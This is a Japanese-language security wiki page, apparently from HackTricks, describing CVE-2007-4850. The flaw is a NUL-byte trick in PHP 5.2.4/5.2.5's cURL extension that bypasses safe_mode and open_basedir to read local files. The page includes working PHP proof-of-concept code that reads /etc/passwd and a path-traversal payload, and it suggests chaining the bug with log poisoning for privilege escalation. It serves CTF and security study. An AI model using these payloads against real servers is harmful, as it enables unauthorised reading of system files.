# PHP 5.2.4 and 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

このページは、特定の PHP 5.2.x ビルドで cURL 拡張を使って PHP の safe_mode/open_basedir チェックをバイパスする、レガシーだが CTFs やローカルの古い環境ではまだ有用なトリックを記録しています。

- 影響対象: PHP 5.2.4 および 5.2.5（ext/curl 有効）。
- 影響: safe_mode や open_basedir の制限があっても任意のローカルファイルを読み取れる（直接のコード実行は不可）。
- ID: CVE-2007-4850.

出典: http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## ワンライナー PoC

safe_mode や open_basedir が有効で cURL が有効な場合、以下は現在のスクリプトの内容を返します:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## より明示的な PoC（任意ファイル読み取り）
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
注意:
- 実際の NUL byte を注入するにはダブルクォートまたは chr(0) を使用してください。Percent-encoding (%00) は確実に動作しません。
- これは file read primitive です。可能なら log poisoning、session file inclusion など他のプリミティブと組み合わせてさらなる権限昇格を試みてください。

## Why this works (short)

脆弱性は PHP 5.2.4/5.2.5 が ext/curl 内で file:// URL に対する safe_mode/open_basedir チェックを行う方法にあります。チェックは URL をパースしてパス成分を検証していましたが、NUL-byte の扱いのために libcurl が実際に使用する文字列とは異なる文字列を検証してしまいました。実際には、バリデータは NUL の後のパスを許可する一方で libcurl は URL コンテナとして NUL の前の部分を使用していたため、NUL の後に配置されたファイルを読み取る回避が可能になりました。詳細はオリジナルの解析と curl/interface.c の影響を受けるマクロを参照してください。[CVE-2007-4850].

## Constraints and fixes

- ext/curl のパース/検証を修正することで後続の 5.2.x（例: ディストリビューションで 5.2.6 にパッチされたビルド）で修正されています。
- 非常に古い PHP 展開にのみ影響します。safe_mode は PHP 5.4 で削除されており、現代のビルドではこの挙動は見られません。

## Related historical cURL-based bypasses

- CVE-2006-2563 (PHP 4.4.2/5.1.4): libcurl ラッパーが埋め込まれた NUL を含む `file://` アクセスを許可し、open_basedir を回避できた; 5.2.x より前に修正された。
- PHP bugs #30609/#36223 tracked early cURL open_basedir issues using `file://` without canonicalization. Any check before the NUL byte or without `realpath`-style resolution is prone to the same truncation.

## CTF tips

- PHP 5.2.4/5.2.5 で ext/curl がロードされていることを確認したら（`phpinfo()` の `cURL support => enabled` と正確な `PHP Version` を確認）、ext/curl が `file://` を自身で処理するため `allow_url_fopen` が無効でもこのトリックは通常動作します。
- 直接パスがブロックされている場合は、NUL の後に相対パストラバーサルを試してみてください。例: `file://x\x00../../../../etc/passwd`。トラバーサルの解決は open_basedir ガードではなく libcurl によって行われます。
- ユーザー制御の URL を `curl_exec()` に反映する脆弱なサーバーサイドコード（レガシーな SSRF ライクなエンドポイントに一般的）を通じて LFI を誘発するため、ペイロードを単一の HTTP リクエストボディにラップすることができます。

## See also

Other disable_functions/open_basedir bypasses and modern techniques are collected here:

{{#ref}}
README.md
{{#endref}}

## References

- [Ubuntu CVE entry with patch pointers and affected versions](https://ubuntu.com/security/CVE-2007-4850)
- [Technical writeup with code context (cxsecurity)](http://cxsecurity.com/issue/WLB-2008010060)
- [PHP bug #36223 (curl bypasses open_basedir)](https://bugs.php.net/bug.php?id=36223)
- [CVE-2006-2563 cURL PHP File Access Bypass (earlier NUL-byte issue)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2563)
{{#include ../../../../banners/hacktricks-training.md}}
